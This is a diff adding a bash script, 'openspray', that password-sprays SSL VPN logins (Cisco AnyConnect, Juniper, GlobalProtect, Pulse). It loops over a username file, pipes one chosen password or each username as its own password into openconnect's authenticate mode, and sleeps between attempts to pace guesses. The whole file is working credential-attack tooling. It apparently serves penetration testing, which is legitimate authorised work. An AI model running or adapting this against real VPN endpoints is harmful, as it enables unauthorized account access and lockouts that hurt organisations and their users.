@@ -1,0 +1,83 @@
+#!/bin/bash
+display_usage() {
+	echo -e "Usage:\nopenspray [options]\n"
+	echo -e "\nsudo apt-get install openconnect\n\n"
+	echo -e "-h, --help\t\tDisplay help text"
+	echo -e "-f\t\t\tSet username file"
+	echo -e "-p\t\t\tSet password to spray"
+	echo -e "-s\t\t\tVPN Server"
+	echo -e "-v\t\t\tVPN Distro"
+	echo -e "\tanyconnect\tCisco AnyConnect SSL VPN"
+	echo -e "\tnc\t\tJuniper Network Connect"
+	echo -e "\tgp\t\tPalo Alto GlobalProtect SSL VPN"
+	echo -e "\tpulse\t\tPulse Connect Secure SSL VPN"
+	echo -e "\n-t\t\t\tSet sleep time between sprays (basic sleep commands; 5 = 5 seconds)"
+	echo -e "-c\t\t\tpin-sha256 hash from server; argument shaped like: -c pin-sha256:<cert>"
+	echo -e "\t\t\t\tValue obtained from \`openconnect <server> --servercert=1234\`\n"
+	echo -e "-r\t\t\tSet password as username: true. Default: false"
+}
+
+# if less than two arguments supplied, display usage 
+	if [  $# -le 1 ] 
+	then 
+		display_usage
+		exit 1
+	fi 
+ 
+# check whether user had supplied -h or --help . If yes display usage 
+	if [[ ( $# == "--help") ||  $# == "-h" ]] 
+	then 
+		display_usage
+		exit 0
+	fi 
+passAsUser="false"
+password=""
+while getopts 'f:p:s:v:t:c:r:' option
+do
+	case "${option}"
+		in
+		f) file="${OPTARG}";;
+		p) password=${OPTARG};;
+		s) server=${OPTARG};;
+		v) protocol=${OPTARG};;
+		t) sleeep=${OPTARG};;
+		c) cert=${OPTARG};;
+		r) passAsUser=${OPTARG};;
+	esac
+done
+ 
+RED='\033[0;31m'
+NC='\033[0m'
+WHITE='\033[0;36m'
+BLUE='\033[0;34m'
+GREEN='\033[0;32m'
+
+echo -e "${RED}###################${NC}"
+echo -e "${RED}Starting OpenSpray!${NC}"
+echo -e "${RED}###################${NC}"
+
+if [ "$passAsUser" == "true" ];
+then
+	echo -e "${BLUE}Spraying username as password${NC}"
+	for i in `cat $file`
+	do 
+		echo -e "${GREEN}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%${NC}"
+		echo -e "${WHITE}User: " $i "${NC}"
+		echo $i | sudo openconnect $server --user=$i --passwd-on-stdin --protocol=$protocol --authenticate --servercert $cert
+		echo -e "${GREEN}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%${NC}"
+		printf "\n\n\n"
+		sleep $sleeep
+	done
+else
+	echo -e "${BLUE}Not spraying username as password${NC}"
+	for i in `cat $file`
+	do 
+		echo -e "${GREEN}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%${NC}"
+		echo -e "${WHITE}User: " $i "${NC}"
+		echo $password | sudo openconnect $server --user=$i --passwd-on-stdin --protocol=$protocol --authenticate --servercert $cert
+		echo -e "${GREEN}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%${NC}"
+		printf "\n\n\n"
+		sleep $sleeep
+	done
+fi
+
